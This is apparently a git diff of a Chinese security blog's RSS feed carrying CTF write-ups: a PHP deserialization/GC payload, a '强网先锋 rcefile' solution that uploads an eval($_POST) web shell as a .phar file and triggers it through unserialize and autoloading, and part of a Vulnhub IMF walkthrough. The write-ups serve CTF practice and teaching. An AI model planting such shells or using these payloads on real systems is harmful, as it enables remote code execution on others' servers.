+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;urlencode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;注意数组需要设置为0&lt;strong&gt;达到提前销毁对象的目的&lt;/strong&gt; 触发gc垃圾回收，%3A&lt;strong&gt;1&lt;/strong&gt;%3B  &amp;ndash;&amp;gt; %3A&lt;strong&gt;0&lt;/strong&gt;%3B&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22thirdstring%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A1%3BN%3B%7D
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818000953651.png&#34;
-	width=&#34;1360&#34;
-	height=&#34;525&#34;
-	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818000953651_hu8cef5ea5c63867151d3ca7ee5e71c3df_85848_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818000953651_hu8cef5ea5c63867151d3ca7ee5e71c3df_85848_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220818000953651&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;259&#34;
-		data-flex-basis=&#34;621px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818001040323.png&#34;
-	width=&#34;1559&#34;
-	height=&#34;850&#34;
-	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818001040323_huefafc9afff26f1ef004132ba9fb5e3fc_220463_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818001040323_huefafc9afff26f1ef004132ba9fb5e3fc_220463_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220818001040323&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;183&#34;
-		data-flex-basis=&#34;440px&#34;
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;改成：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22thirdstring%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;参考链接&#34;&gt;🔗参考链接&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://yangxikun.com/php/2013/08/24/php-garbage-collection-mechanism.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PHP新的垃圾回收机制 (yangxikun.com)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://blog.m1kael.cn/index.php/archives/14/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PHP的GC机制 - M1kael‘s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/11843?accounttraceid=411ebc73f66f4f69aea04cef67b0ae0akryd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;浅析PHP GC垃圾回收机制及常见利用方式 - 先知社区 (aliyun.com)&lt;/a&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -1222,6 +1203,156 @@
 		class=&#34;gallery-image&#34; 
 		data-flex-grow=&#34;340&#34;
 		data-flex-basis=&#34;816px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>2022强网先锋  rcefile</title>
+        <link>http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/</link>
+        <pubDate>Wed, 17 Aug 2022 00:00:00 +0000</pubDate>
+        
+        <guid>http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/</guid>
+        <description>&lt;img src="http://main1o.github.io/1.png" alt="Featured image of post 2022强网先锋  rcefile" /&gt;&lt;h1 id=&#34;2022强网先锋--rcefile&#34;&gt;2022强网先锋  rcefile&lt;/h1&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1u0m2yrAAmt8kBoZTGCfKpA?pwd=1234&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;环境下载地址&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;代码审计&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/q1352483315/article/details/89527820&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;spl_autoload_register 说明&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234937507.png&#34;
+	width=&#34;1164&#34;
+	height=&#34;510&#34;
+	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234937507_hu8ab47c86e1280fbec6723458802ea055_57332_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234937507_hu8ab47c86e1280fbec6723458802ea055_57332_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220817234937507&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;547px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;spl_autoload_register()&lt;strong&gt;在没有限制的情况，new有一个当前不存在的类test，&lt;strong&gt;spl_autoload_register&lt;/strong&gt;会自动去当前目录下包含文件名为&lt;/strong&gt;test.php&lt;/strong&gt; 或者是&lt;strong&gt;test.inc&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;unserialize&lt;/strong&gt;反序列化本地cookie[&amp;lsquo;userfile&amp;rsquo;]&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;upload.php&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在39行黑名单中并没有对 &lt;strong&gt;phar&lt;/strong&gt; 后缀进行过滤&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234147354.png&#34;
+	width=&#34;1900&#34;
+	height=&#34;936&#34;
+	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234147354_hu355b9069130ff33d2038b415b106cf92_145545_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234147354_hu355b9069130ff33d2038b415b106cf92_145545_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220817234147354&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;202&#34;
+		data-flex-basis=&#34;487px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;上传文件 1.jpg  内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;修改后缀 为 1.phar  并  查看图片获取重命名之后的图片名称&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234834576.png&#34;
+	width=&#34;1263&#34;
+	height=&#34;848&#34;
+	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234834576_hu2b629fbd0296c0ff6c8d69392f6631da_140561_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220817234834576_hu2b629fbd0296c0ff6c8d69392f6631da_140561_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220817234834576&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;148&#34;
+		data-flex-basis=&#34;357px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818000313742.png&#34;
+	width=&#34;722&#34;
+	height=&#34;142&#34;
+	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818000313742_huaab396d7c856ac7fe393a1d508fb1ce8_15266_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818000313742_huaab396d7c856ac7fe393a1d508fb1ce8_15266_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220818000313742&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;508&#34;
+		data-flex-basis=&#34;1220px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用这个名称去构建一个序列化对象 ，&lt;strong&gt;config.inc.php&lt;/strong&gt;去cookie里找，并进行反序列化。触发**spl_autoload_register()**去包含&lt;/p&gt;
+&lt;p&gt;afd4b9668ced586e2528dc1863a650fd.inc&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;afd4b9668ced586e2528dc1863a650fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 不能数字开头
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;__construst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;afd4b9668ced586e2528dc1863a650fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# O:32:&amp;#34;afd4b9668ced586e2528dc1863a650fd&amp;#34;:0:{}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818000953651.png&#34;
+	width=&#34;1360&#34;
+	height=&#34;525&#34;
+	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818000953651_hu8cef5ea5c63867151d3ca7ee5e71c3df_85848_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818000953651_hu8cef5ea5c63867151d3ca7ee5e71c3df_85848_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220818000953651&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;259&#34;
+		data-flex-basis=&#34;621px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818001040323.png&#34;
+	width=&#34;1559&#34;
+	height=&#34;850&#34;
+	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818001040323_huefafc9afff26f1ef004132ba9fb5e3fc_220463_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/image-20220818001040323_huefafc9afff26f1ef004132ba9fb5e3fc_220463_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220818001040323&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;183&#34;
+		data-flex-basis=&#34;440px&#34;
 	
 &gt;&lt;/p&gt;
 </description>
@@ -1924,734 +2055,12 @@ encode:&lt;/p&gt;
 &lt;/div&gt;</description>
         </item>
         <item>
-        <title>IMF靶机</title>
-        <link>http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/</link>
-        <pubDate>Fri, 24 Jun 2022 00:00:00 +0000</pubDate>
-        
-        <guid>http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/</guid>
-        <description>&lt;img src="http://main1o.github.io/%E7%8C%AB%E7%BE%BD%E9%9B%AB.jpg" alt="Featured image of post IMF靶机" /&gt;&lt;h1 id=&#34;vulnhub靶机&#34;&gt;Vulnhub靶机&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;难度：中等&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;信息收集&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -f 192.168.100.142
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;靶机只开放了80段口
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-1.png&#34;
-	width=&#34;1613&#34;
-	height=&#34;924&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-1_huea359479e49e4d1117805572a0553473_178803_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-1_huea359479e49e4d1117805572a0553473_178803_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-1&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;174&#34;
-		data-flex-basis=&#34;418px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;页面源代码，找到第一个Flag_1&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;echo &amp;quot;YWxsdGhlZmlsZXM=&amp;quot; | base64 -d&lt;/code&gt;,得到&lt;code&gt;allthefiles&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-2.png&#34;
-	width=&#34;1080&#34;
-	height=&#34;745&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-2_hu0a9c787f4a9e65c1b4c59a37e63aed5f_47346_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-2_hu0a9c787f4a9e65c1b4c59a37e63aed5f_47346_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-2&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;144&#34;
-		data-flex-basis=&#34;347px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;文件名疑似Base64, 拼凑解码&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;echo &amp;quot;ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==&amp;quot; | base64 -d &lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;flag2{aW1mYWRtaW5pc3RyYXRvcg==}&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;再解一下得到&lt;code&gt;imfadministrator&lt;/code&gt; ， imf 的admin登录地址，访问&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594.png&#34;
-	width=&#34;735&#34;
-	height=&#34;397&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594_hu5a8a7d9765c4767548a4e7d1da966666_19379_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594_hu5a8a7d9765c4767548a4e7d1da966666_19379_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519091108594&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;185&#34;
-		data-flex-basis=&#34;444px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;页面提示，没有使用SQL，密码被编码了 (似乎在页面有一个叫&amp;rsquo;Roger&amp;rsquo;&amp;hellip;)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826.png&#34;
-	width=&#34;485&#34;
-	height=&#34;174&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826_hu401af29ee5d3ad6346ec6a1e8ab68455_8472_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826_hu401af29ee5d3ad6346ec6a1e8ab68455_8472_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519091527826&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;278&#34;
-		data-flex-basis=&#34;668px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225.png&#34;
-	width=&#34;826&#34;
-	height=&#34;256&#34;
